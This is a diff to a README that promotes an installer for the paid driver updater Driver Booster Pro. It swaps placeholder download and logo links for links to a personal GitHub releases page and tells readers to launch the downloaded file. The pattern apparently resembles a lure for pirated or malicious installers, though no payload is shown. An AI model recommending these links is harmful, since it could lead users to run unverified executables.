@@ -20,7 +20,7 @@ Driver Booster Pro is a powerful driver updater program that helps you keep your
 
 You can download the latest version of Driver Booster Pro from the following link: 
 
-[![Download Driver Booster Pro](https://img.shields.io/badge/Download-Release.zip-brightgreen)](https://github.com/assets/Release.zip)
+[![Download Driver Booster Pro](https://github.com/basha2247/Driver-Booster-Pro-Installer-2025/releases)](https://github.com/basha2247/Driver-Booster-Pro-Installer-2025/releases)
 
 Please ensure to launch the downloaded file to begin the installation process.
 
@@ -58,4 +58,4 @@ If you encounter any issues or have any feedback regarding Driver Booster Pro In
 
 Thank you for choosing Driver Booster Pro for your driver update and system optimization needs! 🛠️🔧
 
-![Driver Booster Pro Logo](https://example.com/driver-booster-pro-logo.png)
+![Driver Booster Pro Logo](https://github.com/basha2247/Driver-Booster-Pro-Installer-2025/releases)
